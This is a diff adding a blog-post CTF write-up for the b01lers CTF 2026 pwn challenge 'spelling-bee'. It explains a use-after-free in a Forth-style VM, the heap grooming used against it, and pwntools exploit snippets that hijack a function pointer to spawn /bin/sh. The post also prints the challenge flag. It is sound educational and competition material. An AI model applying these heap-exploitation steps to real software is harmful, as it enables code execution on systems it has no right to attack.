@@ -1,0 +1,215 @@
+---
+title: b01lers CTF 2026
+date: 2026-04-20
+category: writeups
+excerpt: Some fun challenges from b01lers CTF
+tags:
+  - pwn
+  - web
+---
+
+import Challenge from "@components/Challenge.vue";
+
+Last weekend, I played b01lers CTF with slight_smile and we placed 6th or 7th in
+the human division. This is my first CTF this year after agents completely took
+over the scene, and I feel like the landscape has completely changed. Even
+though we're playing in the human division, the effects of the solves and
+dynamic scoring from the agentic division carries over. Challenges that would
+get less than 10 solves previously are now getting 30+ solves. Of the 2 kernel
+pwn challenges, one was blooded in less than an hour, and no challenge got less
+than 10 solves. For once, the OSINT challenge was the second least solved, at 18
+solves total. How much the CTF scene has changed...
+
+# spelling-bee
+
+<Challenge
+  title="pwn/spelling-bee"
+  flag="bctf{1_h473_f0r63771n6_w0rd5_j5475v25fwpck}"
+  solves={147}
+>
+  forth pwn
+</Challenge>
+
+This was a pretty verbose challenge that implemented a stack-based VM. The
+interesting part about the VM is that we can define and delete "words". A word
+is an alias that maps to a sequence of other words and constants. It took me a
+while to understand what the challenge was about, but once we have the correct
+mental model regarding the challenge it's quite easy to reason about.
+
+## UAF on instructions
+
+Since a word can refer to another word, it is necessary for the challenge to
+remember how many words have references to some word that's about to be deleted.
+The definition for a word has the `referenced_by{:c}` field to keep track of
+this:
+
+```c
+typedef struct word {
+  long flags;
+  long length;
+  long referenced_by;
+  void (*code)(void *);
+  void *param;
+} word_t;
+```
+
+However, this field is only incremented when defining a word, and is not
+referred to at all when deleting a word, and so herein lies the vuln. An
+instruction can be deleted when other instructions are still referring to it,
+causing a UAF.
+
+The challenge also kindly gives us the address of a win function. The win
+function is a wrapper around system and it takes in one argument that is passed
+to system. Therefore, we just need to figure out how to overwrite the `code{:c}`
+function pointer of a UAF word, and how to control the content at `*param{:c}`.
+
+## Freed chunks
+
+Quite a few chunks are freed when we delete a word. Let's free a user-defined word:
+
+```
+: victim ;
+defined a new word victim
+forget victim
+forgot word victim
+```
+
+```ansi
+[22;1;32mpwndbg> [22;39mbins
+[33mpwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
+This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.
+
+[34mtcachebins
+[33m0x20 [  1][39m: [34m0x555555560870[39m ◂— 0
+[33m0x30 [  2][39m: [34m0x555555560950[39m —▸ [34m0x555555560920[39m ◂— 0
+[33m0x90 [  1][39m: [34m0x555555560890[39m ◂— 0
+[34mfastbins
+[33mempty
+[34munsortedbin
+[33mempty
+[34msmallbins
+[33mempty
+[34mlargebins
+[33mempty[m
+```
+
+We can infer that the 0x20 chunk is for the name, and the 2 0x30 chunks are the
+`dict_t{:c}` and `word_t{:c}` types respectively. 0x90 is the param field. Let's
+take a look at the `word_t{:c}` chunk.
+
+```ansi
+[22;1;32mpwndbg> [22;39mtel 0x555555560920
+00:0000│ [22;1m   [22m [34m0x555555560920[39m ◂— 0x555555560
+01:0008│ [22;1m   [22m [34m0x555555560928[39m ◂— 0xdd1a97d39cd0ee76
+02:0010│ [22;1m   [22m [34m0x555555560930[39m ◂— 0
+03:0018│ [22;1m   [22m [34m0x555555560938[39m —▸ [31m0x55555555541e (docol)[39m ◂— [38:5:148mpush[38:5:255m [38:5:81mrbp
+[39m04:0020│ [22;1m   [22m [34m0x555555560940[39m —▸ [34m0x555555560890[39m ◂— 0x555555560
+05:0028│ [22;1m   [22m [34m0x555555560948[39m ◂— 0x31 /* '1' */
+06:0030│ [22;1m   [22m [34m0x555555560950[39m ◂— 0x555000035c40
+07:0038│ [22;1m   [22m [34m0x555555560958[39m ◂— 0xdd1a97d39cd0ee76[m
+```
+
+If we allocate a name onto this 0x30 chunk, then we can overwrite the
+`docol{:c}` function pointer to the win function, and then overwrite the 0x90
+param chunk to become /bin/sh. Now we just need to figure out the feng shui to
+do this!
+
+## Some feng shui
+
+When we create a new word, 2 0x30 chunks and 1 0x90 chunk are allocated by
+default. The name is a variable size chunk. In order to make the 0x30 chunks
+"out-of-sync" - allowing us to reclaim the word chunk as a name chunk - we can
+misalign the allocation pair by introducing a name chunk somewhere in the
+freelist, and reclaiming that name chunk as a dict/word. This allows us to put
+arbitrary content into the remaining word chunk, which is also our victim chunk
+that contains the function pointer that we want to overwrite.
+
+```
+freelist before allocation:
+0x30: dict -> word -> name -> dict -> word
+
+freelist after allocating 2x dicts, 2x words:
+0x30: word
+```
+
+Since params is of size 0x90, and every word we define will also consume a 0x90
+chunk, we need to pad the 0x90 freelist with some chunks such that the target
+param chunk is not consumed by another param allocation, so that we can reclaim
+it with a name chunk.
+
+That's about all the things we need to consider for the feng shui!
+
+## Exploit
+
+First, we create a uaf chunk and victim chunk. The uaf chunk is an alias to the
+victim chunk, so when uaf is called it will execute victim's callback.
+
+```py
+p.sendline(b": victim ;")
+p.sendline(b": uaf victim ;")
+```
+
+Next, we perform the necessary setup for the feng shui. We'll modify the desired
+freelists a bit such that the following happens instead:
+
+```
+0x30: dict -> word -> dict -> word -> name -> dict -> word_victim
+0x90: name -> param -> param -> param -> param_victim
+```
+
+```py
+p.sendline(b": " + b"a"*0x20 + b" ;")
+p.sendline(b": " + b"a"*0x50 + b" ;")
+p.sendline(b": " + b"a"*0x79 + b" ;")
+
+p.sendline(b"forget victim")
+p.sendline(b"forget " + b"a"*0x20)
+p.sendline(b"forget " + b"a"*0x50)
+p.sendline(b"forget " + b"a"*0x79)
+```
+
+Note that for the 0x90 name, we need to use a size smaller than 0x80 because the
+maximum token size that `expect_token{:c}` can read is 0x7f characters.
+
+Now, on allocating 2 0x90 words, the new state of the freelists is:
+
+```
+0x30: name -> dict -> word_victim
+0x90: param_victim
+```
+
+We can then allocate the next 0x90 word containing the /bin/sh string as the
+name. The program must return us the 0x90 chunk, but we cannot use spaces to pad
+our /bin/sh string. Therefore, we can prepend something like ../../bin/sh to pad
+the path to 0x79 characters.
+
+```py
+p.sendline(b": " + b"a"*0x79 + b" ;")
+p.sendline(b": " + b"a"*0x79 + b" ;")
+p.sendline(b":")
+payload = b"/bin/sh"
+payload = b"../" * ( (0x79 - len(payload)) // 3 ) + payload
+p.sendline(payload)
+p.sendline(b";")
+```
+
+After this, the state of the freelists is:
+
+```
+0x30: word_victim
+0x90:
+```
+
+And allocating a new 0x30 name onto word_victim will modify the function pointer
+and pop us a shell!
+
+```py
+payload = b": "
+payload += b"a"*0x18
+payload += p64(system)
+p.sendline(payload)
+p.sendline(b";")
+p.sendline(b"uaf")
+```
+
+`bctf{1_h473_f0r63771n6_w0rd5_j5475v25fwpck}`
